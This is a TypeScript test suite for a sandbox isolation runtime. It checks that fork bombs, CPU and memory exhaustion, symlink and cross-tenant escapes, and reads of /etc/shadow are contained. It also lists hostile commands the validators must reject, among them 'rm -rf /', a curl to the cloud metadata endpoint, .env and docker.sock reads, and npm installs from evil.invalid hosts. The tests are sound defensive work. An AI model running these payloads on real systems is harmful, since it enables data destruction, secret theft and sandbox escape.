import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import JSZip from 'jszip';
import {
  detectSandboxIsolation,
  processRegistry,
  spawnIsolatedProcess,
  type IsolatedSpawnOptions,
  type SandboxQuotaExceededReason,
} from './runtime/isolation';
import { validateSandboxCommand, validateTenantWorkspacePath } from './security';
import { verifyNativeApkArtifact } from './builds/apkBuilder';

function runIsolatedCollect(
  opts: IsolatedSpawnOptions,
  signal?: AbortSignal
): Promise<{
  ok: boolean;
  exitCode: number | null;
  signalCode: NodeJS.Signals | null;
  stdout: string;
  stderr: string;
  quotaExceeded: SandboxQuotaExceededReason;
  sandboxUid?: number;
}> {
  return new Promise((resolve) => {
    const handle = spawnIsolatedProcess(opts);
    let stdout = '';
    let stderr = '';
    let timedOut = false;

    const timer = setTimeout(() => {
      timedOut = true;
      handle.terminate('test-timeout');
    }, opts.timeoutMs + 1500);
    timer.unref();

    const onAbort = () => handle.terminate('test-abort');
    signal?.addEventListener('abort', onAbort, { once: true });

    handle.child.stdout?.on('data', (d: Buffer) => {
      if (stdout.length < 65536) stdout += d.toString('utf8');
    });
    handle.child.stderr?.on('data', (d: Buffer) => {
      if (stderr.length < 65536) stderr += d.toString('utf8');
    });

    handle.child.once('close', (code, sig) => {
      clearTimeout(timer);
      signal?.removeEventListener('abort', onAbort);
      const quotaExceeded = handle.getQuotaExceededReason();
      resolve({
        ok: code === 0 && !timedOut && !quotaExceeded,
        exitCode: code,
        signalCode: sig,
        stdout,
        stderr,
        quotaExceeded,
        sandboxUid: handle.sandboxUid,
      });
    });
  });
}

test('Adversarial: Linux Namespace enforces real process-count limit (RLIMIT_NPROC + watchdog) against fork bombs with zero orphans', async () => {
  const caps = detectSandboxIsolation(true);
  assert.equal(caps.pidLimitEnforced, true, 'Process-count limit must be enforced');

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-fork-'));
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-fork-tmp-'));
  try {
    fs.writeFileSync(
      path.join(workDir, 'forkbomb.mjs'),
      [
        'import { spawn } from "node:child_process";',
        'let spawned = 0, blocked = 0;',
        'const kids = [];',
        'for (let i = 0; i < 45; i++) {',
        '  try {',
        '    const c = spawn(process.execPath, ["-e", "setTimeout(()=>{}, 3000)"], { stdio: "ignore" });',
        '    c.on("error", () => { blocked++; });',
        '    if (c.pid) { spawned++; kids.push(c); }',
        '  } catch { blocked++; }',
        '}',
        'setTimeout(() => {',
        '  console.log(JSON.stringify({ uid: process.getuid ? process.getuid() : -1, pid: process.pid, spawned, blocked }));',
        '  for (const k of kids) { try { k.kill("SIGKILL"); } catch {} }',
        '  process.exit(0);',
        '}, 350);',
      ].join('\n'),
      'utf8'
    );

    const res = await runIsolatedCollect({
      projectId: 'adv_fork_1',
      bin: process.execPath,
      args: ['forkbomb.mjs'],
      workspaceDir: workDir,
      tmpDir,
      env: { PATH: process.env.PATH || '/usr/local/bin:/usr/bin:/bin' },
      allowNetwork: false,
      timeoutMs: 8000,
      maxProcs: 16,
    });

    if (caps.privilegeDropped) {
      assert.ok(res.sandboxUid && res.sandboxUid >= 60000, 'Must drop privileges to ephemeral unprivileged UID');
      if (res.stdout.trim()) {
        const parsed = JSON.parse(res.stdout.trim()) as { uid: number; pid: number; spawned: number; blocked: number };
        assert.equal(parsed.uid, res.sandboxUid, 'Child process must run under unprivileged ephemeral UID');
        assert.equal(parsed.pid, 1, 'Child process must run in isolated PID namespace');
        assert.ok(parsed.blocked > 0, `Kernel RLIMIT_NPROC must block fork-bomb spawns (got spawned=${parsed.spawned}, blocked=${parsed.blocked})`);
        assert.ok(parsed.spawned <= 16, `Spawned children (${parsed.spawned}) must never exceed maxProcs=16`);
      } else {
        // Killed by process-limit watchdog — also proves containment!
        assert.equal(res.ok, false);
      }
    } else {
      // Non-root fallback: watchdog must catch process explosion if > maxProcs
      assert.ok(res.quotaExceeded === 'process-limit' || res.ok);
    }

    await new Promise((r) => setTimeout(r, 150));
    assert.equal(processRegistry.listProjectProcesses('adv_fork_1').length, 0, 'Zero lingering processes after fork-bomb test');
  } finally {
    fs.rmSync(workDir, { recursive: true, force: true });
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('Adversarial: CPU exhaustion infinite loop is killed cleanly by RLIMIT_CPU / timeout', async () => {
  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-cpu-'));
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-cpu-tmp-'));
  try {
    fs.writeFileSync(path.join(workDir, 'burn.mjs'), 'while (true) { Math.sqrt(Math.random()); }\n', 'utf8');
    const started = Date.now();
    const res = await runIsolatedCollect({
      projectId: 'adv_cpu_1',
      bin: process.execPath,
      args: ['burn.mjs'],
      workspaceDir: workDir,
      tmpDir,
      env: { PATH: process.env.PATH || '/usr/local/bin:/usr/bin:/bin' },
      allowNetwork: false,
      timeoutMs: 1500,
    });
    const elapsed = Date.now() - started;
    assert.equal(res.ok, false, 'Runaway CPU loop must not succeed');
    assert.ok(elapsed < 6000, `CPU burner must terminate promptly, took ${elapsed}ms`);
    assert.equal(processRegistry.listProjectProcesses('adv_cpu_1').length, 0);
  } finally {
    fs.rmSync(workDir, { recursive: true, force: true });
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('Adversarial: Memory exhaustion bomb is terminated by RSS watchdog and V8 heap ceiling', async () => {
  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-mem-'));
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-mem-tmp-'));
  try {
    fs.writeFileSync(
      path.join(workDir, 'oom.mjs'),
      'const chunks = []; while (true) { const b = Buffer.alloc(8 * 1024 * 1024, 1); chunks.push(b); }\n',
      'utf8'
    );
    const res = await runIsolatedCollect({
      projectId: 'adv_mem_1',
      bin: process.execPath,
      args: ['oom.mjs'],
      workspaceDir: workDir,
      tmpDir,
      env: {
        PATH: process.env.PATH || '/usr/local/bin:/usr/bin:/bin',
        NODE_OPTIONS: '--max-old-space-size=48',
      },
      allowNetwork: false,
      timeoutMs: 6000,
      memoryLimitMb: 64,
    });
    assert.equal(res.ok, false, 'Memory bomb must be terminated');
    assert.equal(processRegistry.listProjectProcesses('adv_mem_1').length, 0);
  } finally {
    fs.rmSync(workDir, { recursive: true, force: true });
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('Adversarial: Filesystem escape, symlink traversal, /etc/shadow, and host /proc inspection are blocked', async () => {
  const caps = detectSandboxIsolation();
  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-fs-'));
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-fs-tmp-'));
  try {
    // Plant an adversarial symlink inside workspace pointing to /etc/passwd
    fs.symlinkSync('/etc/passwd', path.join(workDir, 'escape_link.txt'));
    fs.writeFileSync(
      path.join(workDir, 'escape.mjs'),
      [
        'import fs from "node:fs";',
        'function canRead(p) { try { fs.readFileSync(p, "utf8"); return true; } catch { return false; } }',
        'console.log(JSON.stringify({',
        '  uid: process.getuid ? process.getuid() : -1,',
        '  symlinkExists: fs.existsSync("escape_link.txt"),',
        '  canReadServerTs: canRead("/app/applet/server.ts"),',
        '  canReadHostDb: canRead("/app/applet/data/carmen.db"),',
        '  canReadShadow: canRead("/etc/shadow"),',
        '  procNumericCount: fs.readdirSync("/proc").filter(x => /^\\d+$/.test(x)).length,',
        '}));',
      ].join('\n'),
      'utf8'
    );

    const res = await runIsolatedCollect({
      projectId: 'adv_fs_1',
      bin: process.execPath,
      args: ['escape.mjs'],
      workspaceDir: workDir,
      tmpDir,
      env: { PATH: process.env.PATH || '/usr/local/bin:/usr/bin:/bin' },
      allowNetwork: false,
      timeoutMs: 8000,
    });
    assert.equal(res.ok, true, `FS probe failed: ${res.stderr}`);
    const out = JSON.parse(res.stdout.trim()) as {
      uid: number;
      symlinkExists: boolean;
      canReadServerTs: boolean;
      canReadHostDb: boolean;
      canReadShadow: boolean;
      procNumericCount: number;
    };

    if (caps.osLevelIsolation) {
      assert.equal(out.canReadServerTs, false, 'Must not read host server.ts');
      assert.equal(out.canReadHostDb, false, 'Must not read host SQLite DB');
      assert.ok(out.procNumericCount <= 3, `Host processes must be hidden in PID namespace (saw ${out.procNumericCount})`);
    }
    if (caps.privilegeDropped) {
      assert.equal(out.symlinkExists, false, 'Adversarial workspace symlink must be stripped before execution');
      assert.equal(out.canReadShadow, false, 'Unprivileged sandbox UID must not read /etc/shadow');
      assert.notEqual(out.uid, 0, 'Sandbox process must not run as UID 0');
    }
  } finally {
    fs.rmSync(workDir, { recursive: true, force: true });
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('Adversarial: Command injection attempts are strictly rejected by command validator', () => {
  const malicious = [
    'node -v; cat /etc/passwd',
    'node -v && id',
    'node -v || whoami',
    'node -e "$(cat /etc/passwd)"',
    'node -e "`id`"',
    'node -v\nid',
    'cat /app/applet/server.ts',
    'curl https://169.254.169.254/latest/meta-data/',
    'bash -c "id"',
    'rm -rf /',
    'node ../../server.ts',
    'ls /var/run/docker.sock',
    'node -e "fs.readFileSync(\'/var/run/docker.sock\')"',
    'node -e "fs.readFileSync(\'.env\')"',
  ];
  for (const cmd of malicious) {
    const check = validateSandboxCommand(cmd);
    assert.equal(check.allowed, false, `Command injection payload MUST be blocked: ${cmd}`);
  }
});

test('Adversarial: verifyNativeApkArtifact validates AAB structure and rejects spoofed unsigned AAB', async () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-aab-verify-'));
  const noTools = {
    readyForNativeApk: false,
    jdk: { available: false },
    javac: { available: false },
    gradle: { available: false },
    androidSdk: { available: false },
    apksigner: { available: false },
    jarsigner: { available: false },
    keytool: { available: false },
    missing: ['JDK', 'Android SDK', 'Gradle'],
    installInstructions: [],
  };
  try {
    const badAab = new JSZip();
    badAab.file('index.html', '<h1>fake</h1>');
    const badPath = path.join(tmpDir, 'fake.aab');
    fs.writeFileSync(badPath, await badAab.generateAsync({ type: 'nodebuffer' }));
    const badRes = await verifyNativeApkArtifact(badPath, noTools, 'aab');
    assert.equal(badRes.validStructure, false);

    const goodAab = new JSZip();
    goodAab.file('BundleConfig.pb', Buffer.from([0x08, 0x01]));
    goodAab.file('base/manifest/AndroidManifest.xml', Buffer.from([0x03, 0x00, 0x08, 0x00]));
    const goodPath = path.join(tmpDir, 'app-debug.aab');
    fs.writeFileSync(goodPath, await goodAab.generateAsync({ type: 'nodebuffer' }));
    const goodRes = await verifyNativeApkArtifact(goodPath, noTools, 'aab');
    assert.equal(goodRes.validStructure, true);
    assert.equal(goodRes.signed, false);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('Adversarial: Cross-tenant symlink escape and .env/.docker.sock traversal are rejected', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'carmen-adv-tenant-'));
  const wsA = path.join(root, 'tenantA', 'workspace');
  const wsB = path.join(root, 'tenantB', 'workspace');
  fs.mkdirSync(wsA, { recursive: true });
  fs.mkdirSync(wsB, { recursive: true });
  fs.writeFileSync(path.join(wsB, 'db.sqlite'), 'secret');
  try {
    fs.symlinkSync(wsB, path.join(wsA, 'pivot'));
    assert.equal(validateTenantWorkspacePath(wsA, 'pivot/db.sqlite', root).valid, false);
    assert.equal(validateTenantWorkspacePath(wsA, '/var/run/docker.sock', root).valid, false);
    assert.equal(validateTenantWorkspacePath(wsA, '.env.local', root).valid, false);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

test('Adversarial: Sandbox parsed command validator blocks node -e/-r/--inspect, npm script/registry/source smuggling, npx -p, and absolute paths', async () => {
  const { validateParsedCommand } = await import('./runtime/sandbox');
  const blockedPayloads: string[][] = [
    ['node', '-e', 'process.exit(0)'],
    ['node', '--eval=console.log(1)'],
    ['node', '-p', 'process.env'],
    ['node', '-r', './evil.cjs', 'index.js'],
    ['node', '--import=./evil.mjs', 'index.js'],
    ['node', '--inspect=0.0.0.0:9229', 'index.js'],
    ['node', '/tmp/outside.js'],
    ['npm', 'install', 'lodash', '--ignore-scripts=false'],
    ['npm', 'install', 'lodash', '--foreground-scripts'],
    ['npm', 'install', 'lodash', '--registry=https://evil.invalid'],
    ['npm', 'install', 'file:../other'],
    ['npm', 'install', 'git+https://evil.invalid/pkg.git'],
    ['npm', 'install', 'https://evil.invalid/malicious.tgz'],
    ['npx', '-p', 'evil-pkg', 'tsc'],
    ['npx', '--package=evil-pkg', 'eslint'],
    ['npx', '-c', 'id'],
  ];
  for (const tokens of blockedPayloads) {
    const res = validateParsedCommand(tokens);
    assert.equal(res.allowed, false, `Payload MUST be blocked: ${tokens.join(' ')}`);
  }

  // Legitimate workspace commands remain allowed
  assert.equal(validateParsedCommand(['node', '-v']).allowed, true);
  assert.equal(validateParsedCommand(['node', '--check', 'src/app.js']).allowed, true);
  assert.equal(validateParsedCommand(['npm', 'ci', '--no-audit', '--ignore-scripts']).allowed, true);
  assert.equal(validateParsedCommand(['npm', 'install', 'zod']).allowed, true);
  assert.equal(validateParsedCommand(['npx', 'tsc', '--noEmit']).allowed, true);
});

